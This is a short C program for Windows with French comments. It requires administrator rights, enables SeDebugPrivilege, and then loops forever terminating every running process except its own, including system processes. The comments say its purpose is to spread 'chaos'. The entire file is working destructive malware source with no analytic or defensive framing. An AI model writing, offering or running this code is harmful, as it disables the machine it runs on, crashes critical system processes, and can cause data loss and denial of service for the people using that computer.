#include <windows.h>
#include <tlhelp32.h>

// Vérifie si le programme a les privilèges admin
BOOL IsElevated() {
    HANDLE hToken = NULL;
    TOKEN_ELEVATION elevation;
    DWORD dwSize;
    BOOL isAdmin = FALSE;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize)) {
            isAdmin = elevation.TokenIsElevated;
        }
        CloseHandle(hToken);
    }
    return isAdmin;
}

// Active SeDebugPrivilege pour accéder aux processus système
BOOL EnableSeDebugPrivilege() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        return FALSE;
    }

    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
        CloseHandle(hToken);
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
        CloseHandle(hToken);
        return FALSE;
    }

    CloseHandle(hToken);
    return TRUE;
}

// Tente de tuer un processus et gère les erreurs
BOOL KillProcess(DWORD pid) {
    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (hProcess == NULL) {
        return FALSE; // Accès refusé ou erreur, passe au suivant
    }

    BOOL result = TerminateProcess(hProcess, 1);
    CloseHandle(hProcess);
    return result;
}

// Parcourt et tue tous les processus, avec temporisation pour prolonger le chaos
void Mayhem() {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return;
    }

    PROCESSENTRY32 pe = { .dwSize = sizeof(pe) };
    if (!Process32First(hSnapshot, &pe)) {
        CloseHandle(hSnapshot);
        return;
    }

    do {
        if (pe.th32ProcessID == GetCurrentProcessId()) {
            continue; // Ignore le processus courant
        }

        // Tente de tuer le processus
        if (KillProcess(pe.th32ProcessID)) {
            // Petite pause pour prolonger l'effet (optionnel, pour un chaos "lent")
            Sleep(50); // 50ms entre chaque tentative
        }
        // Continue même si erreur (accès refusé, etc.)
    } while (Process32Next(hSnapshot, &pe));

    CloseHandle(hSnapshot);
}

int main() {
    // Vérifie les privilèges admin
    if (!IsElevated()) {
        return 1;
    }

    // Active SeDebugPrivilege
    if (!EnableSeDebugPrivilege()) {
        return 1;
    }

    // Lance le chaos
    while (TRUE) { // Boucle infinie pour s'assurer que le chaos continue
        Mayhem();
        Sleep(100); // Pause entre chaque vague de terminaisons
    }

    return 0;
}
